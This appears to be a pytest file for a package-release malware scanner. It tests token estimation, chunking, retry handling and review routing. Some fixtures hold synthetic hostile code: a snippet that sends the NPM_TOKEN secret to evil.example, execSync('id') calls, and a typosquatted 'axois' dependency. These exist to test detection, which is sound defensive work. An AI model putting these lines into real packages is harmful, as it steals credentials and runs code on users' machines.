"""Dense text must not burn Jev retries or skip local floors.

Synthetic inputs only. These tests do not call Jev, Cursor, or a registry.
"""

import json

import pytest

from hunter.bands import REVIEW_FLOOR, REVIEW_THRESHOLD
from hunter.classify import classification_incomplete, classify_files
from hunter.jev import (
    STATE_TOKEN_BUDGET,
    JevClient,
    JevResult,
    JevUnavailable,
    NoulView,
    invoke_states,
    invoke_with_retry,
    merge_answers,
    pack_chunks,
)
from hunter.models import ReleaseMeta
from hunter.fake_jev import KeywordJev
from hunter.jev_tokens import state_tokens
from hunter.triage import diff_trees, estimate_tokens


def _dense_blob(count: int) -> str:
    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    return "".join(alphabet[index % 64] for index in range(count))


def _meta(*, name: str = "widget", ecosystem: str = "npm") -> ReleaseMeta:
    return ReleaseMeta(
        ecosystem=ecosystem,
        name=name,
        new_version="1.0.1",
        old_version="1.0.0",
        rank=3,
        registry_url="https://example.test/widget",
    )


def _naive_tokens(text: str) -> int:
    return max(1, (len(text) + 3) // 4)


class TooLong:
    def system_one(self, state, questions):
        del state, questions
        raise JevUnavailable("Error code: 400 - max_tokens_exceeded")


class Down:
    def system_one(self, state, questions):
        del state, questions
        raise JevUnavailable("timeout")


def test_prose_stays_on_the_four_character_estimate():
    prose = "The package prints a short greeting and returns.\n" * 40
    assert estimate_tokens(prose) == _naive_tokens(prose)


def test_dense_text_is_estimated_more_tightly_than_chars_over_four():
    blob = _dense_blob(8_000)
    assert " " not in blob
    assert estimate_tokens(blob) > _naive_tokens(blob)
    assert estimate_tokens(blob) >= len(blob.encode("utf-8"))


def test_minified_line_uses_a_stricter_ratio():
    text = "function(){" + ("a+b;" * 80) + "}"
    assert estimate_tokens(text) > _naive_tokens(text)
    assert estimate_tokens(text) >= (len(text.encode("utf-8")) + 1) // 2


def test_dense_blob_is_packed_under_the_budget_even_when_chars_over_four_would_allow_it():
    blob = _dense_blob(40_000)
    assert _naive_tokens(blob) < STATE_TOKEN_BUDGET
    diffs = diff_trees({}, {"lib/payload.js": blob})
    assert diffs
    meta = _meta()
    chunks = pack_chunks(diffs, meta)
    assert len(chunks) > 1
    assert blob in _covered_text(chunks)
    for state in chunks:
        assert state_tokens(state) <= STATE_TOKEN_BUDGET
        assert "[truncated]" not in state["diff_excerpt"]
        assert "lib/payload.js" in state["diff_excerpt"]


def _covered_text(chunks: list[dict]) -> str:
    header = chunks[0]["diff_excerpt"].split("\n", 1)[0]
    parts = []
    for state in chunks:
        excerpt = state["diff_excerpt"]
        rest = excerpt[len(header) :] if excerpt.startswith(header) else excerpt
        if rest.startswith("\n"):
            rest = rest[1:]
        parts.append(rest)
    return "".join(parts)


def test_one_large_file_is_split_across_chunks_and_keeps_its_tail():
    tail = "TAIL_SENTINEL"
    blob = "require('child_process').execSync('id');\n" + ("A" * 20_000) + "\n" + tail + "\n"
    diffs = diff_trees({}, {"lib/payload.js": blob})
    chunks = pack_chunks(diffs, _meta(), budget=2_000)
    assert len(chunks) > 1
    covered = _covered_text(chunks)
    assert tail in covered
    assert "A" * 20_000 in covered
    assert "execSync('id')" in covered
    assert "[truncated]" not in covered
    for state in chunks:
        assert state_tokens(state) <= 2_000
        assert state["diff_excerpt"].startswith("--- ")
        assert "lib/payload.js" in state["diff_excerpt"]


def test_a_bare_400_away_from_the_limit_is_not_sent_again():
    calls = {"n": 0}

    def call(state):
        del state
        calls["n"] += 1
        raise JevUnavailable("400 typesafe returned status 400")

    with pytest.raises(JevUnavailable):
        invoke_states(call, {"diff_excerpt": "short note\n"}, retries=5, sleep=lambda _delay: pytest.fail("slept"))
    assert calls["n"] == 1


def test_a_bare_400_near_the_limit_splits_instead_of_resending(monkeypatch):
    monkeypatch.setattr("hunter.jev.request_near_limit", lambda state, questions=None: True)
    seen: list[str] = []

    def call(state):
        excerpt = state["diff_excerpt"]
        seen.append(excerpt)
        if len(excerpt) > 1_000:
            raise JevUnavailable("400 typesafe returned status 400")
        return len(excerpt)

    excerpt = (
        "--- suspicious_source:a.js\n"
        + ("A" * 900)
        + "\n--- suspicious_source:b.js\n"
        + ("B" * 900)
    )
    result = invoke_states(
        call,
        {"diff_excerpt": excerpt, "file_paths": ["a.js", "b.js"]},
        retries=5,
        sleep=lambda _delay: pytest.fail("slept"),
    )
    assert seen[0] == excerpt
    assert seen.count(excerpt) == 1
    assert len(seen) >= 2
    assert result


def test_invoke_with_retry_does_not_resend_a_bare_400():
    calls = {"n": 0}

    def fn():
        calls["n"] += 1
        raise JevUnavailable("400 typesafe returned status 400")

    with pytest.raises(JevUnavailable):
        invoke_with_retry(fn, retries=5, sleep=lambda _delay: pytest.fail("slept"))
    assert calls["n"] == 1


def test_invoke_with_retry_does_not_resend_max_tokens():
    calls = {"n": 0}

    def fn():
        calls["n"] += 1
        raise JevUnavailable("400 max_tokens_exceeded")

    with pytest.raises(JevUnavailable):
        invoke_with_retry(fn, retries=5, sleep=lambda _delay: pytest.fail("slept"))
    assert calls["n"] == 1


def test_max_tokens_resplits_instead_of_resending_the_same_excerpt():
    seen: list[str] = []

    def call(state):
        excerpt = state["diff_excerpt"]
        seen.append(excerpt)
        if len(excerpt) > 1_000:
            raise JevUnavailable("400 max_tokens_exceeded")
        return len(excerpt)

    excerpt = (
        "--- suspicious_source:a.js\n"
        + ("A" * 900)
        + "\n--- suspicious_source:b.js\n"
        + ("B" * 900)
    )
    result = invoke_states(
        call,
        {"diff_excerpt": excerpt, "file_paths": ["a.js", "b.js"]},
        retries=5,
        sleep=lambda _delay: pytest.fail("slept"),
    )
    assert seen[0] == excerpt
    assert seen.count(excerpt) == 1
    assert len(seen) >= 2
    assert all(len(item) < len(excerpt) for item in seen[1:])
    assert result


def test_an_unfinished_split_is_partial_and_a_finished_one_is_not():
    def call(state):
        if len(state["diff_excerpt"]) > 700:
            raise JevUnavailable("400 max_tokens_exceeded")
        result = JevResult(model="jev-1.13.0")
        result.nouls["network"] = NoulView(0.4)
        return result

    excerpt = (
        "--- suspicious_source:a.js\n"
        + ("A" * 400)
        + "\n--- suspicious_source:b.js\n"
        + ("B" * 400)
    )
    state = {"diff_excerpt": excerpt, "file_paths": ["a.js", "b.js"]}
    partial = invoke_states(call, state, retries=2, sleep=lambda _delay: None, merge=merge_answers)
    assert partial.partial is True
    assert partial.nouls["network"].noul == 0.4
    finished = invoke_states(call, state, retries=5, sleep=lambda _delay: None, merge=merge_answers)
    assert finished.partial is False


def test_a_file_cut_at_the_byte_cap_goes_to_review_unread(monkeypatch):
    monkeypatch.setenv("HUNTER_FILE_READ_BYTES", "1000")
    from hunter.archives import extract_archive
    from tests.archives_factory import tar_bytes

    old = tar_bytes({"package/index.js": "module.exports = 1;\n"})
    new = tar_bytes({"package/index.js": "x" * 5_000})
    jev = KeywordJev()
    result = classify_files(
        meta=_meta(),
        old_files=extract_archive(old),
        new_files=extract_archive(new),
        jev=jev,
    )
    assert jev.calls == []
    assert result.band == "review"
    assert result.needs_llm_review is True
    assert result.defer_reason == ""
    assert classification_incomplete(result) is False
    assert "partial_read" in result.signals
    assert "jev_unreadable" in result.signals
    assert "jev_retry" not in result.signals


def test_a_partial_read_is_not_a_finished_verdict():
    class Partial(KeywordJev):
        def system_one(self, state, questions):
            result = super().system_one(state, questions)
            result.partial = True
            return result

    old = {"index.js": "module.exports = 1;\n"}
    new = {"index.js": "require('child_process').execSync('id');\n"}
    result = classify_files(meta=_meta(), old_files=old, new_files=new, jev=Partial())
    assert result.band == "review"
    assert result.defer_reason == ""
    assert result.needs_llm_review is True
    assert classification_incomplete(result) is False
    assert "partial_read" in result.signals
    assert "jev_unreadable" in result.signals
    assert "jev_retry" not in result.signals


def test_client_splits_a_max_tokens_chunk(monkeypatch):
    monkeypatch.delenv("HUNTER_JEV_RETRIES", raising=False)
    client = JevClient(api_key="test-key", model="jev-1.13.0", retries=5)
    client._sleep = lambda _delay: pytest.fail("slept")
    seen: list[str] = []

    def once(state, questions):
        del questions
        excerpt = state["diff_excerpt"]
        seen.append(excerpt)
        if len(excerpt) > 1_000:
            raise JevUnavailable("400 max_tokens_exceeded")
        result = JevResult(model="jev-1.13.0")
        result.nouls["install_time_execution"] = NoulView(0.2)
        return result

    client._system_one_once = once
    excerpt = (
        "--- suspicious_source:a.js\n"
        + ("A" * 900)
        + "\n--- suspicious_source:b.js\n"
        + ("B" * 900)
    )
    state = {
        "diff_excerpt": excerpt,
        "file_paths": ["a.js", "b.js"],
        "package_name": "widget",
        "slice": "combined",
    }
    first = client.system_one(state, {"install_time_execution": {"type": "noul"}})
    second = client.system_one(state, {"install_time_execution": {"type": "noul"}})
    assert first.nouls["install_time_execution"].noul == 0.2
    assert second is first
    assert seen[0] == excerpt
    assert seen.count(excerpt) == 1
    assert all(len(item) < len(excerpt) for item in seen[1:])


def test_unreadable_phantom_dependency_goes_to_review():
    old = {
        "package.json": json.dumps({"name": "widget", "version": "1.0.0", "dependencies": {}}),
        "index.js": "function add(a, b) { return a + b; }\n",
    }
    new = {
        "package.json": json.dumps(
            {"name": "widget", "version": "1.0.1", "dependencies": {"codec-pad": "1.0.0"}}
        ),
        "index.js": "function add(a, b) { return a + b; }\n",
        "lib/payload.js": _dense_blob(3_000),
    }
    result = classify_files(meta=_meta(), old_files=old, new_files=new, jev=TooLong())
    assert result.band == "review"
    assert result.needs_llm_review is True
    assert result.defer_reason == ""
    assert classification_incomplete(result) is False
    assert "jev_retry" not in result.signals
    assert "ai_incomplete" not in result.signals
    assert "jev_unreadable" in result.signals
    assert any(item.startswith("phantom_runtime_dependency:codec-pad") for item in result.signals)
    assert result.malice_probability >= REVIEW_FLOOR
    assert result.attack_family == "dependency_abuse"


def test_unreadable_typosquat_goes_to_review():
    old = {"index.js": "function add(a, b) { return a + b; }\n"}
    new = {
        "index.js": "require('axois');\n",
        "package.json": json.dumps({"name": "widget", "version": "1.0.1", "dependencies": {"axois": "1.0.0"}}),
        "lib/payload.js": _dense_blob(3_000),
    }
    result = classify_files(meta=_meta(), old_files=old, new_files=new, jev=TooLong())
    assert result.band == "review"
    assert result.needs_llm_review is True
    assert classification_incomplete(result) is False
    assert any(item.startswith("dependency_typosquat:axois~axios") for item in result.signals)
    assert result.malice_probability >= REVIEW_FLOOR
    assert result.attack_family == "dependency_abuse"


def test_unreadable_behavior_chain_goes_to_review():
    old = {"pkg/__init__.py": "def ready():\n    return True\n"}
    new = {
        "pkg/__init__.py": (
            "import os\n"
            "import urllib.request\n"
            "def send():\n"
            "    token = os.environ['NPM_TOKEN']\n"
            "    urllib.request.urlopen('https://evil.example/x?t=' + token)\n"
            "send()\n"
        ),
        "pkg/blob.py": _dense_blob(3_000),
    }
    result = classify_files(
        meta=_meta(ecosystem="pypi", name="pkg"),
        old_files=old,
        new_files=new,
        jev=TooLong(),
    )
    assert result.band == "review"
    assert result.needs_llm_review is True
    assert classification_incomplete(result) is False
    assert any(item.startswith("behavior_chain:") for item in result.signals)
    assert result.malice_probability >= REVIEW_FLOOR


def test_unreadable_release_without_a_floor_still_goes_to_review():
    old = {"index.js": "function add(a, b) { return a + b; }\n"}
    new = {
        "index.js": "function add(a, b) { return a + b; }\n",
        "lib/payload.js": _dense_blob(4_000),
    }
    result = classify_files(meta=_meta(), old_files=old, new_files=new, jev=TooLong())
    assert result.band == "review"
    assert result.needs_llm_review is True
    assert result.defer_reason == ""
    assert classification_incomplete(result) is False
    assert "jev_unreadable" in result.signals
    assert not any(item.startswith("phantom_runtime_dependency:") for item in result.signals)
    assert not any(item.startswith("dependency_typosquat:") for item in result.signals)
    assert not any(item.startswith("behavior_chain:") for item in result.signals)
    assert REVIEW_THRESHOLD <= result.malice_probability < REVIEW_FLOOR


def test_timeout_on_a_phantom_dependency_stays_deferred():
    old = {
        "package.json": json.dumps({"name": "widget", "version": "1.0.0", "dependencies": {}}),
        "index.js": "function add(a, b) { return a + b; }\n",
    }
    new = {
        "package.json": json.dumps(
            {"name": "widget", "version": "1.0.1", "dependencies": {"codec-pad": "1.0.0"}}
        ),
        "index.js": "function add(a, b) { return a + b; }\n",
        "lib/payload.js": _dense_blob(3_000),
    }
    result = classify_files(meta=_meta(), old_files=old, new_files=new, jev=Down())
    assert result.band == "deferred"
    assert result.needs_llm_review is False
    assert "jev_retry" in result.signals
    assert classification_incomplete(result) is True
